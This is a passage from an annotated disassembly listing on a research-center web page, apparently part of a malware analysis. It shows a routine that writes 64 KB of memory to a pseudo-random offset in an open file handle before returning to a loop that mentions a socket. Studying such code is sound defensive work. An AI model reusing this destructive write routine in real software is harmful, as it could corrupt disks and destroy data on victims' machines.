<span style="color:maroon">seg000:0000025E </span>31 C0                             <span style="color:navy">xor     eax</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:00000260 </span>50                                <span style="color:navy">push    eax</span>             ; FILE_BEGIN
<span style="color:maroon">seg000:00000261 </span>50                                <span style="color:navy">push    eax</span>             ; NULL
<span style="color:maroon">seg000:00000262 </span>2D 03 BC FC FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFFCBC03h</span>
<span style="color:maroon">seg000:00000267 </span>F7 E5                             <span style="color:navy">mul     ebp</span>
<span style="color:maroon">seg000:00000269 </span>2D 3D 61 D9 FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFD9613Dh</span>
<span style="color:maroon">seg000:0000026E </span>89 C5                             <span style="color:navy">mov     ebp</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:00000270 </span>D1 E8                             <span style="color:navy">shr     eax</span><span style="color:navy">, </span><span style="color:green">1</span>
<span style="color:maroon">seg000:00000272 </span>66 89 C8                          <span style="color:navy">mov     ax</span><span style="color:navy">, cx</span>
<span style="color:maroon">seg000:00000275 </span>50                                <span style="color:navy">push    eax</span>             ; (rand() &lt;&lt; 15) | 0x4e20
<span style="color:maroon">seg000:00000276 </span>56                                <span style="color:navy">push    esi</span>             ; hFile
<span style="color:maroon">seg000:00000277                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:00000277 </span>3E FF 15 C4 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D40C4h</span> ; Probably SetFilePointer
<span style="color:maroon">seg000:00000277 </span>5E                                                        ; (really not sure about this one)
<span style="color:maroon">seg000:0000027E </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:00000280 </span>51                                <span style="color:navy">push    ecx</span>             ; 0
<span style="color:maroon">seg000:00000281 </span>89 E2                             <span style="color:navy">mov     edx</span><span style="color:navy">, esp</span>
<span style="color:maroon">seg000:00000283 </span>51                                <span style="color:navy">push    ecx</span>             ; NULL
<span style="color:maroon">seg000:00000284 </span>52                                <span style="color:navy">push    edx</span>             ; lpNumberOfBytesWritten
<span style="color:maroon">seg000:00000285 </span>B5 80                             <span style="color:navy">mov     ch</span><span style="color:navy">, </span><span style="color:#ff8000">80h</span> <span style="color:gray">; 'C'
</span><span style="color:maroon">seg000:00000287 </span>D1 E1                             <span style="color:navy">shl     ecx</span><span style="color:navy">, </span><span style="color:green">1</span>
<span style="color:maroon">seg000:00000289 </span>51                                <span style="color:navy">push    ecx</span>             ; nNumberOfBytesToWrite (0x10000)
<span style="color:maroon">seg000:0000028A </span>B1 5E                             <span style="color:navy">mov     cl</span><span style="color:navy">, </span><span style="color:#ff8000">5Eh</span> <span style="color:gray">; '^'
</span><span style="color:maroon">seg000:0000028C </span>C1 E1 18                          <span style="color:navy">shl     ecx</span><span style="color:navy">, </span><span style="color:green">18h</span>
<span style="color:maroon">seg000:0000028F </span>51                                <span style="color:navy">push    ecx</span>             ; lpBuffer (0x5e000000)
<span style="color:maroon">seg000:00000290 </span>56                                <span style="color:navy">push    esi</span>             ; hFile
<span style="color:maroon">seg000:00000291                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:00000291 </span>3E FF 15 94 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D4094h</span> ; Probably WriteFile
<span style="color:maroon">seg000:00000298 </span>56                                <span style="color:navy">push    esi</span>             ; hObject
<span style="color:maroon">seg000:00000299                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:00000299 </span>3E FF 15 38 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D4038h</span> ; Probably CloseHandle
<span style="color:maroon">seg000:000002A0 </span>5E                                <span style="color:navy">pop     esi</span>
<span style="color:maroon">seg000:000002A1 </span>5E                                <span style="color:navy">pop     esi</span>             ; (restoring socket)
<span style="color:maroon">seg000:000002A2 </span>E9 AC FE FF FF                    <span style="color:navy">jmp     loc_153</span>
<span style="color:maroon">seg000:000002A2                   </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:gray">seg000:000002A7 </span>63 76 07 5E                       <span style="color:navy">dd </span><span style="color:#008040">5E077663h
</span><span style="color:maroon">seg000:000002AB                   </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:000002AB </span>E9 21 FE FF FF                    <span style="color:navy">jmp     loc_D1</span>
<span style="color:maroon">seg000:000002AB                   </span><span style="color:gray">; ---------------------------------------------------------------------------
</span>
</pre>
</object>
</span>
</body>
</html>
  </div>

          </main>
        </div>
      </div>

</div>

  

<div class="text-center d-print-none" id="lastmod">
  <div class="d-flex justify-content-center text-muted">
    <div><small>
      <i class="fa fa-clock-o"></i> <strong>Published</strong>
      <time datetime="2020-08-03T21:14:17&#43;00:00">August 3, 2020</time>
    </small></div>
    <div class="mx-3">
    </div>
  </div>
  
</div>
<footer class="d-print-none">
  
  <div class="sub-footer">
  <div class="container">
    <div class="row">
      <div class="col-2">
        
      </div>
      <div class="col-8">
        <div class="sub-footer-inner">
          <ul>
            <li>Center&nbsp;for Applied Internet&nbsp;Data&nbsp;Analysis based at the <a href="//www.sdsc.edu/">University&nbsp;of&nbsp;California's San&nbsp;Diego&nbsp;Supercomputer&nbsp;Center</a></li>
          </ul>          
        </div>
      </div>
      <div class="col-2">
        <div class="sub-footer-inner">
          <a href="/about/legal/privacy/">Privacy</a>
        </div>
      </div>
    </div>
  </div>
</div>  

  
  <script>
    function renderSidebar(){
      if(window.innerWidth >= 1920){

        $("#sidebarcontainer").removeClass("container");
        $("#sidebarcontainer").addClass("container-fluid");
        $("#asidebar").addClass("");
        $("#asidebar").addClass("col-xxxl-1");
        
        
        let main_width = $(".breadcrumb").width();
        $("main").css({"max-width": main_width});
        
        
        let marg_size = $(".breadcrumb")[0].getBoundingClientRect().x - $("aside")[0].getBoundingClientRect().width-10;
        $("#asidebar").css({"margin-left":marg_size+"px"});
        

        $("#sidebarcontainer").css({"opacity":"1"});

      } else {

        $("#sidebarcontainer").removeClass("container-fluid");
        $("#asidebar").removeClass("text-right");
        $("#asidebar").css({"margin-left":""});
        $("main").css({"max-width": ""});

        $("#sidebarcontainer").addClass("container");
        $("#sidebarcontainer").css({"opacity":"1"});

      }
    }

    renderSidebar();

     
    $(window).resize(renderSidebar);
    
  </script>
  <noscript>
    <style>#sidebarcontainer { opacity: 1; }#asidebar { opacity: 0; }</style>
  </noscript>
  <script src="/js/global.min.1992dba80a48e77b7e07524905e69c43841fcce5b7a7c705029337060887ea57.js"></script>

  <script src="/c2supportfiles/awstats_misc_tracker.js" ></script>
  <noscript><img src="/c2supportfiles/awstats_misc_tracker.js?nojs=y" height="0" width="0" style="display: none; border: 0;" alt="" /></noscript>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GJW4XFS0MC"></script>
  <script>
  function isDoNotTrackEnabled() {
    if (typeof window === 'undefined') return false
    const { doNotTrack, navigator } = window
    const dnt = (doNotTrack || navigator.doNotTrack || navigator.msDoNotTrack || msTracking())
    if (!dnt) return false
    if (dnt === true || dnt === 1 || dnt === 'yes' || (typeof dnt === 'string' && dnt.charAt(0) === '1')) {
      return true
    }
    return false
  }

  function msTracking() {
    const { external } = window
    return 'msTrackingProtectionEnabled' in external &&
    typeof external.msTrackingProtectionEnabled === 'function' &&
    window.external.msTrackingProtectionEnabled()
  }

  if (!isDoNotTrackEnabled()) {
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-GJW4XFS0MC', { 'anonymize_ip': false, cookie_flags: 'SameSite=None;Secure' });
  }
  </script>
  
  
  
</footer>
</body>

</html>
